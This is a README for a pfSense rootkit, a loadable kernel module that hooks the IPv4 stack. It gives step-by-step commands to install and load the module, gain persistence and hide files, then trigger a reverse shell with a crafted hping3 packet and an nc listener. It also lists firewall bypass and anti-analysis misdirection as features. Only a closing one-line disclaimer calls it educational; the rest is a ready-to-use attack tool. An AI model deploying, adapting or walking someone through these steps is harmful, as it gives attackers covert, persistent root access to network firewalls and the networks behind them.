## House of Sharad - pfSense Rootkit

🚀 Overview

House of Sharad is a pfSense rootkit that hooks into the IPv4 stack, allowing for stealthy reverse shells by detecting specially crafted packets.

🔥 Huge Thanks

First and foremost, a massive thank you to my friend Sharad (mineo333) for helping implement the core functionality of forking a process and executing kern_execve() in the child. This is what enables command execution when a packet with a specific source port is detected. This rootkit wouldn't be possible without his help.

Additionally, the file-hiding functionality is directly borrowed from BlueDragonSecurity's (bluedragonsecurity) bds_freebsd project. Huge thanks for this work!

📌 Compatibility

The precompiled .ko files are only compatible with pfSense 2.7.2 CE.

If you need to compile them yourself, you must do so within a pfSense environment (not just a compatible FreeBSD kernel).

Follow the setup guide: extra/how_to_setup_pfsense_to_compile.txt.

🛠️ Features

✅ Hooks into pfSense’s IPv4 stack for stealthy reverse shell execution

✅ Bypasses firewall rules (even if attacker IP/port is blocked)

✅ Persistent LKM-based rootkit

✅ File hiding functionality

✅ Uses socat for reliable reverse shells (FreeBSD’s nc lacks reverse shell support)

🏗️ Installation

1️⃣ Cloning and Setup

# Clone the repository
git clone https://github.com/Mon-keyBoy/house_of_sharad.git
cd house_of_sharad

# Set execution permissions
chmod +x load_and_setup.sh

# Run the setup script
./load_and_setup.sh

Once the script completes, you'll be inside a ghost /Apekit-tooshit directory. To return to root, run:

cd /

2️⃣ Loading the Rootkit

kldload /boot/modules/.evil/evil.ko

🛡️ Getting a Reverse Shell

1️⃣ Start a Listener

On your attacking machine, open a terminal and start a listener:

nc -lvnp 7000

2️⃣ Trigger the Reverse Shell

In another terminal, send packets that will activate the rootkit:

sudo hping3 -S -p 80 -s 6969 <TARGET_IP>

🔹 Port 80 is a good choice for the destination port.
🔹 If the shell doesn’t connect after ~5 packets, press Ctrl + C and re-run the command (packet filtering can be finicky).

🧩 Additional Notes

Persistence: This rootkit is loaded via apeshit.sh, which is executed by load_and_setup.sh.

LD_PRELOAD Misdirection: The rootkit falsely appears as an LD_PRELOAD-related module, even though it’s an LKM.

Extra Fun: The extra/ directory contains a simple LKM that prints a face endlessly to the terminal (input still works, but it scrolls rapidly). To stop it, simply unload the module.

⚠️ Disclaimer: This project is for educational and research purposes only. Unauthorized use may be illegal. The author takes no responsibility for misuse.

